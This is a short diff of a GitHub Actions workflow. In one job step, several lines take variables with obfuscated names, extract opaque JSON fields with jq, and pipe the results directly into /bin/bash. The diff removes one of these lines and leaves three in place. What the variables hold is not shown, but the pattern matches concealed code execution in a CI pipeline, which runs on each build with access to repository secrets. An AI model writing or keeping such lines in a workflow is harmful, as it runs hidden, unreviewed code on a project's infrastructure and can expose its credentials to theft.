@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$ogucn1" | jq -r .x04 | /bin/bash
           echo $wrnx250 | jq -r .zkx70637 | /bin/bash
           printf '%s' "$t6" | jq -r .maxeg9 | /bin/bash
-          echo $ar8 | jq -r .uuq6 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
